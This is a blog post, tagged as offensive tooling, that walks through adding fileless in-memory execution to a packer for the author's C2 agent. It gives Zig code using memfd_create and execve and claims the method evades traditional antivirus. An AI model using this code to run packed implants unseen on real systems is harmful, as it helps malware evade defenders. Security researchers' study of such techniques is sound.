---
title: "Painless Guide to Linux in-Memory Execution"
date: 2025-12-04T08:21:15+03:00
tags: ["zig", "Offensive", "fileless", "in-memory execution", "Linux"]
categories: ["zig", "Offensive", "in-memory execution"]
keywords: ["zig", "in-memory execution", "Linux"]
draft: false
---

In-memory execution, a technique that allows programs to be run directly from 
memory without being written to disk. Over the past few weeks, I've been attempting
to learn and understand this concept better. In a previous [post](https://pop-ecx.github.io/pack-to-the-futureobfuscating-my-c2-agent/),
I explained my reasoning behind choosing ZYRA for obfuscation and packing. The 
key reason behind I could take it to whichever direction I wanted, should
need arise.

Safe to say, need did arise. So in this post, we'll modify ZYRA to support in-memory
execution. How zyra unpacks, decrypts and executes the payload is beyond the scope
of this post. However, if you're interested in learning more, I would recommend
reading through its code. It's not super complex, and is very digestable.

One of the most directly accessible ways to achieve in-memory execution on Linux
is by leveraging the `memfd_create` syscall. This syscall allows us to create an
anonymous file in memory, which can then be executed without ever touching the disk.
You can read more about it by running `man memfd_create`.

Here's a basic outline of how we can implement in-memory eexecution using `memfd_create`:
1. **Create a memory file descriptor**: Use the `memfd_create` syscall to create
    an anonymous memory file descriptor.

2. **Write the payload to memory**: Write the unpacked and decrypted payload to 
    the memory file descriptor.

3. **Execute the payload**: Use `execve` or similar functions to execute the payload
    directly from memory.

We'll do this in Zig since ZYRA is written in Zig. So, let's get to some code:

> Some customary warning: If you're going to try this out, do it in your own fork so you don't disturb the original project.

We'll first define a function to handle the in-memory execution that takes only
one parameter, the payload to be executed and uses the `noreturn` keyword since
the function will not return to the caller:

> **At the time of writing this, ZYRA uses Zig 0.14.0**
```zig
fn executeInMemory(payload: []const u8) noreturn {
    // Our code will go here
    }
```

Next, we'll create the memory fd using `memfd_create`. This is super direct to do
in Zig:

```zig
const fd = std.os.linux.memfd_create("zyra_payload", 0);
```

After creating the memory fd, we need to write our payload to it. We can use the
write function for this:

```zig
 _ = std.os.linux.write(@intCast(fd), payload.ptr, payload.len);
```
Now that the payload is written, it is not necessary to set it as executable.
[Here is why](https://www.kernel.org/doc/html/latest/userspace-api/mfd_noexec.html) .

The next part is the most involving part so far. We need to prepare the arguments
and environment for the `execve` call. This involves creating C-style null-terminated
strings for the filename, args and environment variables.

```zig
var path_buf: [64]u8 = undefined;
const proc_path = std.fmt.bufPrint(&path_buf,
    "/proc/self/fd/{d}",.{fd}) catch unreachable;
path_buf[proc_path.len] = 0; // Null-terminate
const path_cstr: [*:0]const u8 = path_buf[0..proc_path.len: 0]
                                .ptr;

var argv_arr: [2]?[*:0]const u8 = .{
    path_cstr,
    null,
};
const argv: [:null]const ?[*:0]const u8 = argv_arr[0.. :null];

var envp_arr: [1]?[*:0]const u8 = .{
    null,
};

const envp: [:null]const ?[*:0]const u8 = envp_arr[0.. :null];
```
Here, we create a buffer for the path to the memory fd, and null-terminate it by
hand. There is probably a better way to do this in Zig. We then create arrays for
the args and envrironment variables, ensuring they are null-terminated as well.

Finally, we can call `execve` to execute the payload directly from memory:
```zig
_ = std.os.linux.execve(path_cstr, argv, envp);

std.os.linux.exit(127);
```
Since `execve` does not return on success, we add an exit call after it to say
that if we reach that point, shit hit the fan.

Now, we can just call this function from main and pass the unpacked and decrypted payload.

```zig
executeInMemory(decrypted_payload);
```

To demo this, I packed my C2 agent with ZYRA, modified it to use the above function
for in-memory execution, and ran it on a Linux machine. The agent ran successfully.

Running strace on the process confirms that the payload runs from memory.

```bash
m3lk0r@ubuntu:~$ strace -f ./rango
1700 execve("./rango", ["./rango"], 0x7ffd30677308 /* 28 vars
*/) = 0
1700 execve("/proc/self/fd/3", ["/proc/self/fd/3"], 
0x7ffcaf034378 /* 0 vars */) = 0
1701 execve("/usr/local/bin/hostname", ["hostname", "-I"],
0x700d9af80038 /* 0 vars */) = -1 ENOENT
1701 execve("/bin//hostname", ["hostname", "-I"],
0x700d9af80038 /* 0 vars */) = 0
1701 +++ exited with 0 +++
```

This memfd_create technique bypasses traditional AV but may fail against EDR.
There are other techniques of doing in-memory execution in Linux. I may write
about those in the future, I'm not promising anything though.
